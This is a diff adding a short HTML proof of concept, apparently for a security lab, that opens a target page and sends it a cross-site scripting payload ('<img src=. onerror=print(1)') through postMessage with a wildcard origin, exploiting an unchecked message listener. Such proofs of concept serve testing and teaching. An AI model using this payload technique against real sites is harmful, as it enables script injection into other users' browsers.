@@ -1,0 +1,13 @@
+<html>
+	<head><title>Test eventlisteners</title></head>
+	<body>
+		<script>
+				function injectMessage(){
+					var vulnurl = "http://ptl-38627af5-235459f3.libcurl.so/";
+					var vuln = window.open(vulnurl);
+					vuln.postMessage("<img src=. onerror=print(1)","*");
+				};
+
+		</script>
+	</body>
+</html>
